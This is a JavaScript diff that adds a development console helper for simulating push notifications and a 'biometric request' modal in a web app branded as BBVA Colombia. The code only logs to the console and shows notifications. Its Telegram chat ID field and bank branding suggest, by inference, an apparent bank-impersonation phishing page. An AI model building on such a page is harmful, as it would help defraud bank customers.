@@ -511,4 +511,46 @@ document.addEventListener('DOMContentLoaded', () => {
         }, { once: true });
     }
 
+    // ── Helper de prueba (solo desarrollo) ────────────────────
+    // Úsalo desde la consola del navegador:
+    //   bbvaTestPush()                          → notificación genérica
+    //   bbvaTestPush('biometric')               → solicitud biométrica
+    //   bbvaTestPush('generic', 'Mi mensaje')   → texto personalizado
+    window.bbvaTestPush = function(type = 'generic', body = 'Prueba de notificación BBVA') {
+        const token = localStorage.getItem('bbva_fcm_token');
+        console.log('─────────────────────────────────────');
+        console.log('🔔 FCM Token activo:', token || '⚠️ No hay token (¿concediste permiso?)');
+        console.log('─────────────────────────────────────');
+
+        if (type === 'biometric') {
+            // Simula un push de autenticación biométrica
+            window.dispatchEvent(new CustomEvent('bbva-biometric-request', {
+                detail: {
+                    type:           'BIOMETRIC_REQUEST',
+                    sessionId:      'test-session-' + Date.now(),
+                    telegramChatId: '123456789',
+                    userName:       localStorage.getItem('bbva_user') || 'Usuario'
+                }
+            }));
+            console.log('✅ Evento biométrico simulado → el modal biométrico debería abrirse');
+        } else {
+            // Simula un push genérico (toast)
+            window.dispatchEvent(new CustomEvent('bbva-push-notification', {
+                detail: { title: 'BBVA Colombia', body }
+            }));
+            console.log('✅ Notificación genérica simulada → debería aparecer el toast');
+        }
+
+        // También dispara una notificación nativa del navegador si hay permiso
+        if (Notification.permission === 'granted') {
+            new Notification('BBVA Colombia', {
+                body,
+                icon: '/zcp/icono-pwa.png'
+            });
+            console.log('✅ Notificación nativa del navegador enviada');
+        } else {
+            console.warn('⚠️ Permiso de notificaciones no concedido. Permiso actual:', Notification.permission);
+        }
+    };
+
 });
